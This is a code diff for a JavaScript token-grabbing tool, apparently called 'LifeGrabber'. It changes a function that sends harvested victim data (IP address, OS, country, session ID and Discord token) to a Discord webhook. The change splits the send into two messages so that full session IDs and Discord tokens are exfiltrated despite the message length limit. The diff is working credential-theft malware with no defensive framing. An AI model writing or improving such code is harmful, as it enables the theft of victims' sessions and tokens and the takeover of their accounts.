@@ -42,7 +42,8 @@ async function sendDiscordWebhook(webhookUrl, grab, isNew) {
   const safeToken = grab.discord_token ? (grab.discord_token.length > 1020 ? grab.discord_token.substring(0, 1020) + '...' : grab.discord_token) : 'None';
 
   try {
-    const res = await fetch(webhookUrl, {
+    // Send main embed
+    const res1 = await fetch(webhookUrl, {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify({
@@ -58,16 +59,29 @@ async function sendDiscordWebhook(webhookUrl, grab, isNew) {
             { name: 'IP', value: grab.ip_address || 'Unknown', inline: true },
             { name: 'OS', value: grab.os || 'Unknown', inline: true },
             { name: 'Country', value: grab.country || 'Unknown', inline: true },
-            { name: 'Session ID', value: safeSession, inline: false },
-            { name: 'Discord Token', value: safeToken, inline: false },
           ],
           footer: { text: `LifeGrabber · ${new Date().toLocaleString()}` },
         }],
       }),
     });
-    if (!res.ok) {
-      console.error('Webhook returned error:', await res.text());
+    if (!res1.ok) console.error('Webhook 1 returned error:', await res1.text());
+
+    // Send second message with the tokens (Discord message limit is 2000 chars)
+    let tokenMsg = '';
+    if (grab.session_id) tokenMsg += `**Session ID:**\n\`\`\`\n${grab.session_id.substring(0, 1900)}\n\`\`\`\n`;
+    if (grab.discord_token) tokenMsg += `**Discord Token:**\n\`\`\`\n${grab.discord_token.substring(0, 1900)}\n\`\`\``;
+
+    if (tokenMsg) {
+      const res2 = await fetch(webhookUrl, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          content: tokenMsg.substring(0, 2000)
+        }),
+      });
+      if (!res2.ok) console.error('Webhook 2 returned error:', await res2.text());
     }
+
   } catch (e) {
     console.error('Webhook failed:', e.message);
   }
